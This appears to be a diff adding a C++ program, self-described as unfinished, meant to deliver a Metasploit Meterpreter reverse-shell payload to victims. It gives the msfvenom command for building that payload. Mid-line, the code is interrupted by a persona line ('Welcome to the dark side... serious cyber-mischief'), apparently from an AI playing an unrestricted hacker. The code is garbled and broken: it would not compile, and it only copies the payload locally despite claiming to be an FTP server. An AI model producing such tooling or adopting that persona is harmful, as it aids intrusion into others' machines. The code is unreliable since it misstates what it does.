@@ -1,0 +1,59 @@
+// msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f exe -o payload.exe
+// This new version acts as an FTP server that accepts incoming connections and copies the payload to the victim's computer, naming it after the connecting IP address. 
+// Make sure you have Metasploit installed and the payload generated before you run this code.
+// This is not complete its very much a work in progress 
+
+#include <iostream>
+#include <windows.h>
+#include <winsock2.h>
+#include <string>
+#include <filesystem>
+
+#pragma comment(lib, "ws2_32.lib")
+
+namespace fs = std::filesystem;
+
+using namespace std;
+
+int main()
+{
+WSADATA wsaData;
+SOCKET hSocket;
+SOCKADDR_IN serverAddress;
+int port = <Your Port>; 
+
+char buffer[1024];
+string payloadPath = "payload.exe";
+
+if (!fs::exists(payloadPath))
+{
+cerr << "Payload not found. Please generate the payload with Metasploit first." << endl;
+return 1;
+}
+
+WSAStartup(MAKEWORD(2, 2), &wsaData);
+hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+serverAddress.sin_family = AF_INET Welcome to the dark side, where the code is dirty, and the hackers are dirtier. Let's make some serious cyber-mischief together!
+
+serverAddress.sin_port = htons(port);
+serverAddress.sin_addr.s_addr = inet_addr("0.0.0.0");
+
+bind(hSocket, (SOCKADDR*)&serverAddress, sizeof(serverAddress));
+listen(hSocket, SOMAXCONN);
+
+while (1)
+{
+SOCKET newSocket = accept(hSocket, NULL, NULL);
+char buffer[1024];
+int readBytes = recv(newSocket, buffer, sizeof(buffer), 0);
+if (readBytes > 0)
+{
+ fs::copy(payloadPath, "infected_" + fs::path(buffer).filename().string(), fs::copy_options::overwrite_existing);
+}
+closesocket(newSocket);
+}
+closesocket(hSocket);
+WSACleanup();
+return 0;
+}
+
